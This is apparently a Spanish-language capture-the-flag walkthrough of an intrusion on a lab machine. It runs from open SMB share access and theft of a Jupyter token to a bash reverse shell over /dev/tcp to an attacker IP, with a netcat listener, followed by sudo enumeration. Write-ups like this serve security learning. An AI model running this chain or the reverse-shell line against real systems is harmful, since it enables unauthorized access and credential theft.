

- conectamos a la carpeta compartida
```
smbclient //10.10.23.134/datasci-team
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> 
smb: \> dir
  .                                   D        0  Thu Aug 25 16:27:02 2022
  ..                                  D        0  Thu Aug 25 16:27:02 2022
  .ipynb_checkpoints                 DA        0  Thu Aug 25 16:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 16:26:46 2022
  misc                               DA        0  Thu Aug 25 16:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 16:26:46 2022
  papers                             DA        0  Thu Aug 25 16:26:47 2022
  pics                               DA        0  Thu Aug 25 16:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 16:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 16:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 16:26:46 2022

		15587583 blocks of size 4096. 8939859 blocks available
smb: \> cd misc
smb: \misc\> dir
  .                                  DA        0  Thu Aug 25 16:26:47 2022
  ..                                 DA        0  Thu Aug 25 16:26:47 2022
  jupyter-token.txt                   A       52  Thu Aug 25 16:26:47 2022

		15587583 blocks of size 4096. 8939859 blocks available
smb: \misc\> get jupyter-token.txt
getting file \misc\jupyter-token.txt of size 52 as jupyter-token.txt (25.4 KiloBytes/sec) (average 25.4 KiloBytes/sec)
smb: \misc\> exit

```
- sacamos el token
```
cat jupyter-token.txt 
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```

- nos loguemos, creamos una nueva notebook
```
!ping -c3 10.10.57.9
```

- verificamos si llega el ping desde alla, y si lo hace
```
root@ip-10-10-57-9:~# tcpdump -i ens5 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
01:29:17.507100 IP ip-10-10-23-134.eu-west-1.compute.internal > ip-10-10-57-9.eu-west-1.compute.internal: ICMP echo request, id 27, seq 1, length 64
01:29:17.507155 IP ip-10-10-57-9.eu-west-1.compute.internal > ip-10-10-23-134.eu-west-1.compute.internal: ICMP echo reply, id 27, seq 1, length 64
01:29:18.508167 IP ip-10-10-23-134.eu-west-1.compute.internal > ip-10-10-57-9.eu-west-1.compute.internal: ICMP echo request, id 27, seq 2, length 64
01:29:18.508230 IP ip-10-10-57-9.eu-west-1.compute.internal > ip-10-10-23-134.eu-west-1.compute.internal: ICMP echo reply, id 27, seq 2, length 64
01:29:19.509489 IP ip-10-10-23-134.eu-west-1.compute.internal > ip-10-10-57-9.eu-west-1.compute.internal: ICMP echo request, id 27, seq 3, length 64
01:29:19.509537 IP ip-10-10-57-9.eu-west-1.compute.internal > ip-10-10-23-134.eu-west-1.compute.internal: ICMP echo reply, id 27, seq 3, length 64
```

- ahora lanzamos un reverse-shell

```
!/bin/bash -c 'bash -i >& /dev/tcp/10.10.57.9/4444 0>&1'
```

```
root@ip-10-10-57-9:~# nc -lnvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.23.134 51566 received!
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ whoami
whoami
dev-datasci
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ cd /home/dev-datasci
cd /home/dev-datasci
(base) dev-datasci@DEV-DATASCI-JUP:~$ ls
ls
anaconda3
anacondainstall.sh
datasci-team
dev-datasci-lowpriv_id_ed25519
(base) dev-datasci@DEV-DATASCI-JUP:~

(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ cd /etc 
cd /etc
(base) dev-datasci@DEV-DATASCI-JUP:/etc$ ls ws*
ls ws*
wsl.conf
(base) dev-datasci@DEV-DATASCI-JUP:/etc$
onda deactivate
dev-datasci@DEV-DATASCI-JUP:/etc$ cd /home/dev-datasci
cd /home/dev-datasci
dev-datasci@DEV-DATASCI-JUP:~$ ls
dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci
        -c *

```


